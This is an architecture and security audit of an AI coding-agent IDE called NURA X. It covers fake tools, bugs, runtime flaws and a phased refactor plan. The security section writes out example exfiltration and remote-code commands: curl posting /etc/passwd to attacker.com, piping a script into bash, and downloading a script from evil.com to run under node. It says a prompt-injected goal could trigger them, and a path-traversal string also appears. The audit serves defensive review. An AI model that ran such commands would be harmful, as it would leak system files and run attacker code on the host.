# NURA X — Complete System X-Ray & Execution Blueprint
### Principal AI Systems Architect Audit — Evidence-Based, No Sugar-Coating

---

## 1. Executive Summary

NURA X is architecturally more advanced than most hobby AI IDE projects. The core agent engine is **real and functional**: the LLM tool-calling loop, file system operations, shell execution, package management, server lifecycle management, and SSE streaming all work. However, the system has **a cluster of critical architectural flaws**, **broken user-interaction flows**, **fake components masquerading as real ones**, **security vulnerabilities**, **memory risks**, and a **dual-runtime identity crisis** that actively blocks autonomous coding reliability.

The single most dangerous flaw: **`agentQuestion` looks like it blocks for user input — it does not. It immediately returns the default answer.** The agent cannot truly pause and ask the user anything. All human-in-the-loop logic is UI theatre.

The system is approximately **65% real, 25% structurally broken, 10% placeholder/fake**.

---

## 2. Current System Architecture

```
USER (Browser)
  │
  ├── ChatInput → useAgentRunner (POST /api/run)
  │                └── EventSource /api/agent/stream?runId=...
  │
  ├── Console     ← SSE /sse/console
  ├── FileExplorer← SSE /sse/files + REST /api/list-files
  └── Preview     ← /preview/:projectId/* (HTTP proxy)

BACKEND (Express on :3001, Vite on :5000)
  │
  ├── /api/run → ChatOrchestrator
  │     └── controller.ts → generateRunId → DB insert → executeAsync()
  │           ├── mode="agent" (DEFAULT) → executeToolLoopRun()
  │           │     └── runAgentLoop() [tool-loop.agent.ts]
  │           │           └── while(steps < 25):
  │           │                 llm.chatWithTools() → OpenRouter
  │           │                 toolOrchestrator.execute(toolName, args, ctx)
  │           │                 bus.emit("agent.event", ...)
  │           └── mode="pipeline" → executePipelineRun() [rarely used]
  │
  ├── EventBus (bus.ts) → fan-out to all SSE subscribers
  ├── ToolOrchestrator (38 tools) → real execution
  ├── Sandbox (/home/runner/workspace/.data/sandboxes/:projectId/)
  ├── Preview Proxy (/preview/:projectId/* → 127.0.0.1:[5000+projectId%1000])
  └── PostgreSQL (Drizzle ORM) → projects, agentRuns, artifacts tables
```

---

## 3. Real vs. Fake Components

### ✅ REAL (works as described)

| Component | File | Evidence |
|---|---|---|
| ReAct agent loop | `server/agents/core/tool-loop/tool-loop.agent.ts` | Real while-loop calling OpenRouter, executing tools, feeding results back |
| file_read/write/delete/list | `server/agents/tools/categories/file-tools.ts` | Uses `fs/promises` directly |
| file_replace/search | `server/agents/tools/categories/file-search-tools.ts` | Real regex-based in-file replacements |
| shell_exec | `server/agents/tools/categories/shell-tools.ts` | `child_process.spawn`, allowlisted commands |
| package_install/uninstall | `server/agents/tools/categories/package-tools.ts` | Runs real `npm install` |
| server_start/stop/restart/logs | `server/agents/tools/categories/server-lifecycle-tools.ts` | Manages real child processes, captures stdout/stderr |
| git_status/add/commit/push/pull | `server/agents/tools/categories/git-tools.ts` | Wraps real git CLI |
| db_push/migrate | `server/agents/tools/categories/db-tools.ts` | Runs drizzle-kit push |
| Preview proxy | `server/infrastructure/proxy/preview-proxy.ts` | Real HTTP pipe to child process port |
| SSE streaming | `server/chat/streams/sse.ts` | Real EventSource, bus-backed |
| Event bus | `server/infrastructure/events/bus.ts` | Pub/sub fan-out |
| PostgreSQL persistence | `shared/schema.ts` + Drizzle | `projects`, `agentRuns`, `artifacts` tables |
| Sandbox isolation | `server/infrastructure/sandbox/sandbox.util.ts` | Path-scoped to `.data/sandboxes/:id` |
| task_complete / agent_message | `server/agents/tools/categories/agent-control-tools.ts` | Real event emitters |

### ❌ FAKE / BROKEN (does not work as described)

| Component | File | What It Pretends | What It Actually Does |
|---|---|---|---|
| `agentQuestion` | `agent-control-tools.ts:50–90` | Blocks agent loop, waits for user answer | Emits question event then **immediately returns the default answer**. User input has zero effect on the agent. |
| `deploy_publish` (Replit target) | `deploy-tools.ts:47–51` | Deploys app to Replit | Runs `npm run build`, then **returns the dev domain URL as "deployed"**. No actual deployment occurs. |
| `browser_eval` | `browser-tools.ts` | Puppeteer headless browser evaluation | Fails silently if Puppeteer isn't installed. Puppeteer is **not in package.json**. |
| `GoalRunner` | `client/src/components/agent/GoalRunner.tsx` | Displays goal execution UI | **Returns `null`**. Renders nothing. |
| `Timeline` | `client/src/components/layout/Timeline.tsx` | Shows run timeline | **Returns `null`**. Renders nothing. |
| `/publishing` route | `client/src/pages/publishing/publishing.tsx` | Publishing management page | **Placeholder**. No functionality. |
| `GridPublishingPage` | `client/src/pages/preview/grid-publishing-page.tsx` | Publishing in grid mode | **Placeholder**. |
| Billing section | Usage page in client | Billing management | Static HTML, no backend, no data |

---

## 4. Working vs. Broken Systems

### ✅ Fully Working
- LLM → Tool → Feedback loop (tool-loop mode)
- File read/write in sandbox
- Shell command execution (allowlisted)
- npm package installation inside sandbox
- Server process management
- SSE delivery of agent events to frontend
- File explorer (tree, CRUD, SSE file-change events)
- Console log streaming
- PostgreSQL run persistence

### ⚠️ Partially Working / Unreliable
- **Preview system**: Two parallel runtimes (`runtime.routes.ts` + IQ2000 `preview/` pipeline) with different APIs and no unified client. Frontend `usePreviewRuntime` targets IQ2000 routes (`/api/run-project`); other parts target `/api/runtime/`. Port assignment is deterministic but fragile.
- **Pipeline mode** (`executePipelineRun`): Defined with 9 phases, but the default path always uses tool-loop. The 9-phase pipeline is mostly untested in production flows.
- **Agent metrics**: Real-time metrics tracked in `ToolOrchestrator._metrics` (Map). Correct while the server is alive. **Reset to zero on every server restart**.

### ❌ Fully Broken
- **Human-in-the-loop** (`agentQuestion`): The agent cannot actually pause and wait for user input. The question-bus (`server/chat/run/question-bus.ts`) exists but the tool never awaits it — it resolves immediately with the default answer.
- **Deployment**: `deploy_publish` with `target=replit` returns the dev URL with no actual deploy action.
- **Browser automation**: `browser_eval` requires Puppeteer which is not installed.

---

## 5. Critical Bugs (Exact Files + Lines)

### BUG-001: `agentQuestion` never blocks — architecture lie
**File:** `server/agents/tools/categories/agent-control-tools.ts`, lines 62–89

The tool emits `agent.question` to the bus (so the UI can show a question), then **immediately** returns:
```typescript
return {
  ok: true,
  result: {
    answer: defaultAnswer,                      // ← always the default
    message: "Question sent to user. Using default answer to continue.",
  },
};
```
The `question-bus.ts` file has `waitForAnswer()` and `resolveQuestion()` functions, but `agentQuestion.run()` never calls `waitForAnswer()`. The agent never pauses. The frontend's "answer" submission button has no backend effect on the running agent.

**Impact:** The LLM thinks it asked the user and got an answer, but the "answer" was always the default. The human-in-the-loop system is completely non-functional.

---

### BUG-002: Dead import — `getTool` called but result discarded
**File:** `server/agents/core/tool-loop/tool-loop.agent.ts`, line 93–113

```typescript
const tool = getTool(call.name);   // ← result stored but NEVER USED
// ...
if (!toolOrchestrator.has(call.name)) { ... }  // ← duplicate check via orchestrator
const exec = await toolOrchestrator.execute(...);
```
`getTool()` is called, the result is assigned to `tool`, and `tool` is never referenced again. This is a dead call that burns CPU and adds confusion.

---

### BUG-003: `/sse/agent` double-writes every event
**File:** `server/chat/streams/sse.ts`, lines 74–84

```typescript
r.get("/sse/agent", (req, res) => {
  const off = bus.subscribe("agent.event", (e) => {
    sseSend(res, "agent", e);           // ← proper SSE format
    res.write(`data: ${JSON.stringify(e)}\n\n`); // ← RAW duplicate write
  });
```
Every event sent to `/sse/agent` is written **twice** — once properly formatted and once as a raw `data:` line without an event type. Any client connected to this endpoint will receive malformed duplicate events. This endpoint is used by `useLiveAgentStream.ts`.

---

### BUG-004: Unbounded message array — memory leak in long agent runs
**File:** `server/agents/core/tool-loop/tool-loop.agent.ts`, lines 38–119

The `messages: ToolMessage[]` array grows with every step — assistant messages, tool call results, user messages — with no pruning or windowing. A 25-step run with large file reads (each tool result up to 10KB trimmed) can accumulate **250KB+ of in-memory message history per run**. Multiple concurrent runs compound this. There is no context window management strategy.

---

### BUG-005: Port collision risk in preview
**File:** `server/api/runtime.routes.ts`, line ~20

```typescript
const port = 5000 + (projectId % 1000);
```
- Project ID 1 → port 5001
- Project ID 1000 → port 6000
- Project ID 1001 → port 5001 again (collision with ID 1)

If more than 1000 projects exist, ports repeat. Running two projects with IDs `1` and `1001` simultaneously would attempt to bind the same port.

---

### BUG-006: `deploy_publish` is a fake deploy
**File:** `server/agents/tools/categories/deploy-tools.ts`, lines 47–51

```typescript
if (target === "replit") {
  deployUrl = process.env.REPLIT_DEV_DOMAIN
    ? `https://${process.env.REPLIT_DEV_DOMAIN}`
    : "https://your-app.replit.app";
  steps.push({ step: "deploy", ok: true, output: `Deployed to Replit: ${deployUrl}` });
}
```
No actual deployment happens. The dev domain URL is returned as if the app were deployed. The agent will confidently tell the user "Deployed successfully" with a URL that is the development environment, not a production deployment.

---

### BUG-007: In-memory process registry — no recovery after restart
**File:** `server/api/runtime.routes.ts` (`runningServers` Map) and `server/preview/runtime/runtime.service.ts` (`processes` Map)

Running project processes are tracked only in memory. If the server restarts (crash, deploy, Replit idle timeout), all process state is lost. The UI will show projects as "stopped" with no way to reconnect to orphaned processes, and ports may still be occupied by zombie processes.

---

## 6. Security Vulnerabilities

### SEC-001: `shell_exec` allowlist can be bypassed for data exfiltration
**File:** `server/agents/tools/categories/shell-tools.ts`

`curl` and `wget` are in the ALLOWED_COMMANDS set. An LLM (or a prompt-injected goal) can instruct the agent to:
```bash
curl -X POST https://attacker.com --data @/etc/passwd
curl https://attacker.com/malicious.sh | bash  # ← wget/curl + pipe to sh
```
The second form requires `sh` which is not allowed — but `curl https://evil.com/script.js -o /tmp/s.js && node /tmp/s.js` is possible since `node` is allowed. The allowlist is necessary but insufficient without argument inspection.

**Recommendation:** Inspect `args` array, not just the command name. Block arguments containing `|`, pipes to `node`/`python`, or URLs pointing outside `AGENT_HTTP_ALLOWED_HOSTS`.

### SEC-002: No rate limiting on `/api/run`
**File:** `main.ts`, `server/api/run.routes.ts`

Any client can POST unlimited agent runs. Each run spins up an async process that calls an external LLM (costing money) and executes shell commands. There is no per-IP rate limit, no per-project concurrency limit, and no cost guard.

### SEC-003: Sandbox path validation not bulletproof
**File:** `server/infrastructure/sandbox/sandbox.util.ts`

Path traversal is guarded by checking that the resolved path starts with `SANDBOX_ROOT`. This is the correct approach, but it relies on `path.resolve()` being called correctly by every consumer. If any tool constructs paths via string concatenation without going through `getProjectDir()`, a `../../../etc/passwd` traversal becomes possible.

### SEC-004: `env_read` exposes `.env` file contents to LLM
**File:** `server/agents/tools/categories/env-tools.ts`

The `env_read` tool reads the project's `.env` file and returns it to the LLM message history. If a `.env` file contains real API keys, they are transmitted to OpenRouter and stored in the growing `messages` array in memory. Even with redaction, partial key exposure is possible.

---

## 7. Runtime Problems

1. **Two runtime APIs, no unified client**: `server/api/runtime.routes.ts` (`/api/runtime/:id/start`) and `server/preview/runtime/runtime.service.ts` (`/api/run-project`) manage processes independently with separate in-memory Maps. They can diverge in state.

2. **No process health monitoring**: Once a child process is spawned, there is no periodic health check. If the process crashes silently, the Maps retain stale state showing it as "running."

3. **No port release on crash**: If a project process crashes, the port entry stays in the Map. The next `start` call would attempt to bind the same port again, which may fail.

4. **Server lifecycle tools vs. runtime routes**: `server_start` (an agent tool) manages processes via its own internal Map (`server/agents/tools/categories/server-lifecycle-tools.ts`). This is a **third separate process registry**, fully isolated from the preview pipeline and the runtime routes. Three Maps, zero coordination.

---

## 8. Pipeline Problems

The pipeline mode (`executePipelineRun`) in `server/chat/run/executor.ts` calls `executePipeline()` from `server/agents/core/pipeline/`. This pipeline has 9 phases: Safety → Routing → Decision → Planning → Validation → Generation → Execution → Recovery → Feedback.

**Problems:**
- The default mode is `"agent"` (tool-loop), not `"pipeline"`. Most users never hit the pipeline code.
- The pipeline's code generation phases generate files as strings in memory and then write them via `writeFiles()` — bypassing the tool-loop's file_write tool, meaning the agent doesn't observe its own file writes.
- There is no re-planning step if the pipeline fails mid-way. It is a waterfall, not a loop.
- Pipeline phases emit events but the frontend's `useAgentRunner` is tuned for tool-loop event types (`agent.thinking`, `agent.tool_call`). Pipeline events may not render correctly.

---

## 9. Orchestration Problems

### No Re-planning Loop
When the agent hits `max_steps` (25), it returns `stopReason: "max_steps"` with `success: false`. There is no re-entry — no "here's what I've done so far, continue." The task is simply abandoned.

### No Task Decomposition
Complex goals ("Build me a SaaS with auth, database, payments, and a dashboard") are handed directly to the agent as a single goal. There is no planning phase that breaks the goal into subtasks, executes them sequentially, and verifies each one.

### No Retry on LLM Error
If `llm.chatWithTools()` throws (rate limit, network timeout, invalid response), the agent loop catches the error and immediately returns `stopReason: "error"`. There is no exponential backoff or retry.

### No Checkpoint/Rollback
The agent writes files directly to the sandbox with no snapshotting. If a 20-step agent run generates 15 correct files and then corrupts 3 files in steps 16–18, there is no way to roll back to step 15's state.

---

## 10. Chat System Analysis

**What works:**
- `POST /api/run` → runId generation → DB persistence → async execution ✅
- SSE stream `/api/agent/stream?runId=` → event delivery ✅
- `useAgentRunner` hook correctly handles `agent.thinking`, `agent.tool_call`, `agent.message`, `lifecycle` events ✅
- Cancellation via `DELETE /api/run/:runId` → sets cancel flag, checked in loop ✅

**What's broken:**
- `agentQuestion` → user answer → backend has no effect (BUG-001)
- No conversation continuity across runs — each run starts with a fresh message array. The agent has no memory of what it did in previous runs unless the system prompt encodes it.
- No streaming of partial LLM text — the agent calls `llm.chatWithTools()` and waits for the full response before emitting. Users see nothing while the LLM is generating (the "thinking" indicator but no streamed tokens).
- Multiple hooks consuming the same streams (`use-agent-ultra-stream.ts`, `useLiveAgentStream.ts`, `useAgiStream.ts`, `sse.ts` client-side) — fragmented, potential duplicate subscriptions.

---

## 11. Console System Analysis

**What works:**
- `/sse/console` endpoint streams `console.log` events from the bus ✅
- `AppStateProvider` maintains `consoleOutput` global state ✅
- Console panel displays output ✅

**What's broken:**
- Console logs from **agent tool execution** (shell_exec stdout/stderr) are not automatically forwarded to the console SSE stream. They are returned as tool results to the LLM. The user never sees `npm install` output in real time.
- The `console-log-persister` (`server/chat/index.ts`) flushes logs every 500ms to the DB — but there is no console history API for the frontend to load past logs on page refresh.
- `/sse/solopilot` connects to `console.log` events, duplicating the `/sse/console` endpoint with a different event name but identical logic.

---

## 12. File Explorer Analysis

**What works:**
- Tree rendering ✅
- File CRUD (create, rename, delete) via REST ✅
- SSE `/sse/files` triggers refresh when files change on disk ✅
- `dirtyFiles` and `aiFiles` sets track which files are unsaved or agent-written ✅

**What's broken:**
- The file watcher (`chokidar`) emits `file.change` events on the bus, but the **agent writing files** (via `file_write` tool) does not emit `file.change` to the watcher bus — it writes directly via `fs/promises`. So the file explorer doesn't auto-refresh when the agent writes code. The user must manually refresh or wait for the watcher to pick it up.
- Monaco editor changes are tracked locally as "dirty" but there is no auto-save with debounce — the user must explicitly save, meaning agent-written files and editor edits can diverge.

---

## 13. Preview System Analysis

**What works:**
- HTTP proxy at `/preview/:projectId/*` pipes to `127.0.0.1:[port]` ✅
- Tunnel service resolves Replit dev domain correctly ✅
- Preview panel with device emulation, navigation history ✅

**What's broken:**
- **Three separate process registries** (runtime.routes Map, IQ2000 RuntimeService Map, server-lifecycle-tools Map) with no coordination. If the agent starts a server via `server_start`, the preview proxy may not know the port because it checks a different Map.
- The port for a given `projectId` must be in the proxy's `projectPorts` Map. This Map is populated by the start endpoint. If the agent starts the server via the `server_start` tool (which uses its own Map), `projectPorts` is never updated and the proxy returns 502.
- GridPublishingPage and the standalone `/publishing` route are placeholders.
- **Preview does not auto-reload when agent writes files.** There is no LiveReload/HMR bridge between agent file writes and the preview iframe.

---

## 14. SSE/WebSocket Analysis

**9 SSE endpoints** in `server/chat/streams/sse.ts` for different consumers. Many overlap:

| Endpoint | Listens To | Problem |
|---|---|---|
| `/api/agent/stream` | `agent.event`, `run.lifecycle` | Primary — correct |
| `/sse/agent` | `agent.event` | **Double-writes each event** (BUG-003) |
| `/api/stream` | `agent.event` + `run.lifecycle` + `console.log` | Firehose, used by Analytics |
| `/events` | All 4 event types | Duplicate of `/api/stream` |
| `/sse/console` | `console.log` | Correct |
| `/sse/preview` | `console.log` + `run.lifecycle` | Duplicates console stream |
| `/sse/files` | `file.change` | Correct |
| `/sse/file` | `file.change` | Exact duplicate of `/sse/files` |
| `/api/solopilot/stream` | `console.log` | Duplicates console stream |

**WebSocket** (`/ws/terminal`, `/ws/execute/:id`, `/ws/agent/:id`, `/ws/files/:id`) is attached via `chatOrchestrator.attachWebSocket()`. The frontend uses **only SSE** — these WebSocket paths exist on the backend with no confirmed frontend consumer in the reviewed code.

**Risk:** Each SSE connection subscribes to the bus with `bus.subscribe()`. If a client disconnects abnormally (network drop without TCP RST), `req.on('close')` may not fire, leaving the listener permanently attached — a classic listener leak.

---

## 15. Tool-Calling Analysis

| Capability | Tool | Reality |
|---|---|---|
| Read files | `file_read` | ✅ Real |
| Write files | `file_write` | ✅ Real |
| Replace in files | `file_replace` | ✅ Real |
| Run shell commands | `shell_exec` | ✅ Real (allowlisted) |
| Install packages | `package_install` | ✅ Real |
| Observe server logs | `server_logs` | ✅ Real |
| Start/stop server | `server_start/stop` | ✅ Real |
| Git operations | `git_*` | ✅ Real |
| Push DB schema | `db_push` | ✅ Real |
| Ask user question | `agent_question` | ❌ Fake — returns default immediately |
| Deploy app | `deploy_publish` | ❌ Fake — returns dev URL |
| Browser automation | `browser_eval` | ❌ Broken — Puppeteer not installed |
| Observe AI can retry | — | ❌ Missing — no retry on LLM failure |
| Observe and self-heal | — | ⚠️ Partial — agent reads `server_logs` but no automatic re-plan |

---

## 16. Missing Replit Features

| Feature | Status | Notes |
|---|---|---|
| Real deployment pipeline | ❌ Missing | `deploy_publish` is a stub |
| Checkpoint/snapshot system | ❌ Missing | No rollback after agent damage |
| Conversation memory across runs | ❌ Missing | Each run starts fresh |
| Token streaming from LLM | ❌ Missing | Full response waits, no streaming |
| Real user-input blocking | ❌ Missing | agentQuestion is broken |
| Diff/patch approval UI | ❌ Missing | Agent writes files directly, no review |
| Process recovery after restart | ❌ Missing | In-memory Maps only |
| Rate limiting | ❌ Missing | Unlimited agent runs |
| Multi-user isolation | ❌ Missing | No auth, single workspace |
| Auto-reload preview on agent write | ❌ Missing | No bridge between file_write and HMR |

---

## 17. Missing Autonomous Features

1. **Re-planning loop**: When the agent hits max_steps or fails, it should compact its progress, re-plan remaining steps, and continue — not abort.
2. **Task decomposition**: Large goals need a planning phase that generates an ordered list of subtasks before execution begins.
3. **Error-driven self-healing**: When `server_logs` shows a crash, the agent should automatically read the error, identify the file, patch it, and restart — without user intervention.
4. **Diff approval gate**: Before writing files, the agent should present a unified diff and wait for user approval (real blocking, not the current fake question).
5. **Cross-run memory**: A project context file (e.g., `.nura/context.md`) that the agent reads at the start of every run, summarizing what has been built so far.
6. **Test-and-fix loop**: After writing code, run tests, read failures, fix the code, repeat — automatically.
7. **Streaming LLM tokens**: Users should see the agent "thinking" token-by-token, not wait for a full response.

---

## 18. Scalability Problems

1. **Global event bus**: `bus.ts` is a singleton process-level EventEmitter. All SSE subscribers on all connections share one bus. At scale (100 concurrent users, 100 concurrent agent runs), every event is checked against every subscriber's filter. O(subscribers × events/second) with no partitioning.
2. **In-memory metrics**: `ToolOrchestrator._metrics` is per-process. In a horizontally scaled deployment, each instance has different metric state.
3. **Synchronous tool execution**: Tools are awaited serially per LLM step (except `executeMany` which isn't used by the agent loop). Each step is blocked until its tool resolves.
4. **No job queue**: Agent runs execute directly in the request-handling thread pool. Long-running agents (npm install = 120s timeout) block their async context and accumulate.

---

## 19. Performance Bottlenecks

1. **No LLM response streaming**: The full LLM response is awaited before any processing. For slow models, this means 10–30 seconds of silence per step.
2. **`file_read` with no size limit**: A `file_read` on a large file (e.g., `node_modules/...`) returns all content. Even with the 10KB trim applied after the fact in the agent loop, the full read still happens.
3. **`shell_exec` 30s default timeout**: A slow `npm install` will block the tool for its full timeout, then `packageInstall` has a 120s timeout — these are sequential in a single agent step.
4. **Console persister 500ms batch flush**: Acceptable for display, but log events accumulate in memory between flushes.

---

## 20. Memory Leak Risks

1. **`messages` array** (BUG-004): Unbounded growth during 25-step runs.
2. **SSE listener leak**: If `req.on('close')` doesn't fire on abnormal disconnection, bus subscribers accumulate indefinitely. Each is a function closure referencing `res`, preventing GC.
3. **`server_start` process Map**: `server/agents/tools/categories/server-lifecycle-tools.ts` has an internal `Map<number, ChildProcess>`. If the agent spawns many servers (e.g., in a loop due to a bad prompt), processes accumulate without automatic cleanup.
4. **EventEmitter default max listeners**: Node.js warns at 10 listeners per event. With 9 SSE endpoints + internal subscribers all on the same bus EventEmitter, this warning will fire under moderate load.

---

## 21. System Flow Diagram

### How "Build me a Todo App" CURRENTLY flows:

```
User types "Build me a Todo App"
  │
  ▼
useAgentRunner.handleSend()
  │ POST /api/run { goal, projectId }
  ▼
controller.ts → generates runId → inserts DB → executeAsync()
  │
  ▼ [mode defaults to "agent"]
executeToolLoopRun()
  │
  ▼
runAgentLoop() — maxSteps=25
  │
  ├─ Step 1: LLM thinks → calls file_list("")
  │           toolOrchestrator.execute("file_list") → real fs.readdir
  │           result pushed to messages[]
  │           bus.emit("agent.tool_call") → SSE → UI shows tool badge
  │
  ├─ Step 2: LLM thinks → calls file_write("src/App.tsx", "...")
  │           real fs.writeFile to .data/sandboxes/1/src/App.tsx
  │           bus.emit → SSE → UI shows "wrote App.tsx"
  │
  ├─ Step 3: LLM thinks → calls package_install(["react", "..."])
  │           real npm install in sandbox
  │           (user sees nothing in console — stdout not forwarded)
  │
  ├─ Step 4: LLM thinks → calls server_start()
  │           spawns child process, captures port
  │           (stored in server-lifecycle-tools Map — NOT in preview proxy Map)
  │           preview proxy → 502 Bad Gateway ← BREAK POINT
  │
  ├─ Step N: LLM calls task_complete("Built a Todo App")
  │           bus.emit("run.lifecycle", {status: "completed"})
  │           DB updated
  │
  ▼
useAgentRunner receives "lifecycle" event → sets isAgentThinking=false
User sees final message
Preview panel shows 502 ← user cannot see their app
```

### Where the flow breaks:
- **Preview**: agent's server is invisible to the proxy (separate process Maps)
- **Console**: npm install output never reaches the user
- **File explorer**: doesn't auto-refresh when agent writes files
- **User questions**: agent never actually waits

---

## 22. Correct Replit-Level Architecture

```
USER → Chat → [Streaming SSE tokens]
           │
           ▼
     PLANNER AGENT
       - Decomposes goal into ordered subtasks
       - Writes .nura/plan.md
       - Emits plan to frontend
           │
           ▼ (for each subtask)
     TOOL-LOOP AGENT (ReAct)
       - Observe: read files, read server logs, read test output
       - Think: LLM with streaming tokens
       - Act: tool calls (file_write, shell_exec, package_install...)
       - Verify: run tests, read server logs, check preview
           │
    ┌──────┴──────┐
    │             │
  SUCCESS      FAILURE
    │             │ self-healing: patch → retry (max 3)
    ▼             │ escalate: diff shown to user → approval
  COMMIT        ROLLBACK to last checkpoint
    │
    ▼
  UNIFIED PROCESS MANAGER (single source of truth)
    ├── spawns/tracks child processes
    ├── publishes to event bus (process.start, process.crash, process.log)
    ├── feeds console stream in real-time
    └── feeds preview proxy with correct port

  PREVIEW SYSTEM
    ├── proxy reads from unified process manager
    ├── injects HMR bridge for auto-reload on file_write
    └── screenshot capability for visual verification

  PERSISTENCE
    ├── checkpoints (git commits after each subtask)
    ├── conversation memory in .nura/context.md
    └── run history in PostgreSQL
```

---

## 23. Correct Agent Workflow

```
GOAL: "Build me a Todo App with React and SQLite"

[PLAN PHASE]
  Planner reads sandbox, detects empty project
  Generates subtasks:
    1. Scaffold React + Vite project
    2. Add SQLite + Drizzle
    3. Create Todo schema + migrations
    4. Build API routes
    5. Build React UI
    6. Run tests
    7. Start server + verify preview

[EXECUTE PHASE — per subtask, with checkpoint]
  For subtask 1:
    file_write("package.json", ...) → git commit → checkpoint
    shell_exec("npm", ["install"]) → stream stdout to console bus
    server_start() → register port in unified manager → preview proxy aware
    preview_screenshot() → LLM verifies app loaded
    → PASS → proceed

[SELF-HEAL — if subtask fails]
  server_logs() → read crash
  LLM identifies root cause
  file_replace(badFile, wrongCode, fixedCode)
  server_restart()
  server_logs() → verify fixed
  → PASS → proceed, FAIL → escalate to user with diff

[USER APPROVAL GATE — before destructive operations]
  emit diff to frontend
  await user approval (real Promise.race with timeout)
  user approves → continue
  user rejects → agent uses alternative approach

[COMPLETION]
  git commit "feat: complete Todo App"
  write .nura/context.md with summary
  emit task_complete with preview URL
```

---

## 24. Step-by-Step Refactor Plan

### Phase 1 — Fix Critical Bugs (Days 1–3)

**P1.1: Fix `agentQuestion` to actually block**
- File: `server/agents/tools/categories/agent-control-tools.ts`
- File: `server/chat/run/question-bus.ts` (already exists, just wire it)
- In `agentQuestion.run()`, call `await waitForAnswer(questionId, timeoutMs)` instead of immediately returning
- Add a frontend route: when user submits answer, POST to `/api/run/answer` which calls `resolveQuestion(questionId, answer)`

**P1.2: Fix `/sse/agent` double-write**
- File: `server/chat/streams/sse.ts`, line 80
- Delete the raw `res.write` line — keep only `sseSend(res, "agent", e)`

**P1.3: Remove dead `getTool` call**
- File: `server/agents/core/tool-loop/tool-loop.agent.ts`, line 93
- Remove `const tool = getTool(call.name)` — unused variable

**P1.4: Add message array windowing**
- File: `server/agents/core/tool-loop/tool-loop.agent.ts`
- After pushing to `messages[]`, if `messages.length > 40`, summarize oldest tool messages and replace with a compact summary message

### Phase 2 — Unify the Runtime (Days 4–7)

**P2.1: Create a single `ProcessRegistry` service**
- New file: `server/infrastructure/process/process-registry.ts`
- A single Map tracking `{ projectId → { pid, port, status, childProcess } }`
- Expose: `start(projectId)`, `stop(projectId)`, `restart(projectId)`, `getLogs(projectId)`, `getPort(projectId)`
- All three current registries (runtime.routes, IQ2000 RuntimeService, server-lifecycle-tools) import from this

**P2.2: Wire ProcessRegistry to preview proxy**
- File: `server/infrastructure/proxy/preview-proxy.ts`
- Replace `projectPorts` Map with `processRegistry.getPort(projectId)`

**P2.3: Wire `shell_exec` console output to bus**
- File: `server/agents/tools/categories/shell-tools.ts`
- During stdout/stderr accumulation, emit `bus.emit("console.log", { projectId, text, stream })` per chunk so users see real-time output

### Phase 3 — Self-Healing & Checkpoints (Days 8–14)

**P3.1: Add git checkpoint after every successful agent run**
- File: `server/chat/run/tool-loop.executor.ts`
- After `result.success`, call `git_add` + `git_commit` in the sandbox

**P3.2: Add re-planning on max_steps**
- File: `server/agents/core/tool-loop/tool-loop.agent.ts`
- When `steps >= maxSteps`, call LLM with "summarize what you've done, what remains" and restart with a compact continuation prompt, up to 3 continuation attempts

**P3.3: Add diff approval gate for file writes**
- In `file_write` tool, if file already exists, generate a unified diff and emit it as `agent.diff` event before writing
- Frontend shows diff panel with Approve/Reject buttons
- Backend waits via a new `diff-bus.ts` (same pattern as question-bus)

### Phase 4 — Production Hardening (Days 15–21)

**P4.1: Rate limiting**
- Add `express-rate-limit` on `/api/run`: 10 requests per minute per IP

**P4.2: Streaming LLM tokens**
- Upgrade `llm.chatWithTools()` to support streaming mode
- Emit token chunks as `agent.token` SSE events
- Frontend renders them progressively

**P4.3: Fix `deploy_publish`**
- Integrate Replit's deployment API or add a real build + artifact packaging step
- At minimum, be honest: return `{ deployed: false, message: "Use Replit's Deploy button for production deployment" }`

**P4.4: Security — harden `shell_exec`**
- Inspect `args` array for pipes, redirects, URLs
- Validate against `AGENT_HTTP_ALLOWED_HOSTS` for curl/wget

**P4.5: Add process recovery**
- On server startup, scan `.data/sandboxes/` for `pid` files and attempt to reconnect or clean up zombie processes

---

## 25. Priority-Based Execution Roadmap

| Priority | Item | Impact | Effort |
|---|---|---|---|
| 🔴 P0 | Fix agentQuestion blocking (P1.1) | Unlocks human-in-the-loop | 4h |
| 🔴 P0 | Unify process registry (P2.1, P2.2) | Fixes preview 502 | 1 day |
| 🔴 P0 | Wire shell output to console bus (P2.3) | Users see real-time output | 2h |
| 🟠 P1 | Fix SSE double-write (P1.2) | Stops malformed events | 15min |
| 🟠 P1 | Message array windowing (P1.4) | Prevents memory leak | 2h |
| 🟠 P1 | Git checkpoints after runs (P3.1) | Enables rollback | 3h |
| 🟡 P2 | File explorer auto-refresh on agent write | UX: user sees writes live | 2h |
| 🟡 P2 | Re-planning on max_steps (P3.2) | Handles complex goals | 4h |
| 🟡 P2 | Rate limiting (P4.1) | Security | 1h |
| 🟢 P3 | LLM token streaming (P4.2) | UX: feels alive | 1 day |
| 🟢 P3 | Diff approval gate (P3.3) | Safety for file writes | 2 days |
| 🟢 P3 | Real deploy pipeline (P4.3) | Remove fake deploy | 2 days |
| 🔵 P4 | Shell exec hardening (P4.4) | Security | 4h |
| 🔵 P4 | Cross-run memory (context.md) | Autonomous continuity | 1 day |

---

## 26. Phase-wise Fix Strategy

### Sprint 1 — "Make It Honest" (Week 1)
Goal: Remove all fake behavior, fix all bugs that produce wrong output.
- Fix agentQuestion (P1.1)
- Fix SSE double-write (P1.2)
- Remove dead getTool call (P1.3)
- Fix deploy_publish to be honest about what it does
- Add message windowing (P1.4)

### Sprint 2 — "Make It Connected" (Week 2)
Goal: All subsystems share state correctly, no 502s from preview.
- Unified ProcessRegistry (P2.1)
- Preview proxy reads from registry (P2.2)
- Shell stdout → console bus (P2.3)
- File write → file.change event emission
- File explorer auto-refresh on agent writes

### Sprint 3 — "Make It Safe" (Week 3)
Goal: The agent can work autonomously without destroying the project.
- Git checkpoint after each run (P3.1)
- Re-planning on max_steps (P3.2)
- Rate limiting (P4.1)
- Shell exec argument hardening (P4.4)
- Process recovery on server restart (P4.5)

### Sprint 4 — "Make It Great" (Week 4+)
Goal: Production-grade experience.
- LLM token streaming (P4.2)
- Diff approval gate (P3.3)
- Cross-run project memory
- Real deployment pipeline
- Task decomposition / planner agent
- Test-and-fix autonomous loop

---

## 27. Production-Grade Final Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    FRONTEND (React + Vite)               │
│  Chat → streaming tokens → tool badges → diff panel      │
│  Console → real-time stdout/stderr from any tool         │
│  FileExplorer → auto-refresh on agent writes             │
│  Preview → HMR bridge, auto-reload, screenshot verify    │
└─────────────────────┬───────────────────────────────────┘
                      │ SSE (tokens, events, lifecycle)
                      │ REST (run, answer, approve)
┌─────────────────────▼───────────────────────────────────┐
